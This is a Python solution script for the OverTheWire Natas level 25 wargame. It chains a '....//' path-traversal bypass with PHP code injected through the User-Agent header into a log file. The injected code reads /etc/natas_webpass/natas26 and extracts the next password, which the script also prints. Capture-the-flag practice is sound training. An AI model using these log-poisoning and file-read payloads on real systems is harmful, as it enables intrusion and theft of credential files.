from bs4 import BeautifulSoup
import requests
import re

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies, headers=my_headers)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)

def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())



lvl = '25'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)





my_cookies = {"PHPSESSID":'lllq'} #SUPER RELEVANT for this one
my_params = {"lang":'....//logs/natas25_lllq.log'}
my_headers = {'User-Agent':'<? echo file_get_contents("/etc/natas_webpass/natas26"); ?>'}
res, soup = make()
pw = re.search(r"[a-zA-Z0-9]{32}$", soup.find("div",id="content").text,re.MULTILINE)[0]

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)

'''
Okay, this one was tough. You can inject a payload in the log file via the User-Agent HTTP header,
and return the results by reading from the logs back into the response. Create a random PHPSESSID
for your final attempt if you don't want to hunt through pages of output.



Username: natas26
Password: 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
'''
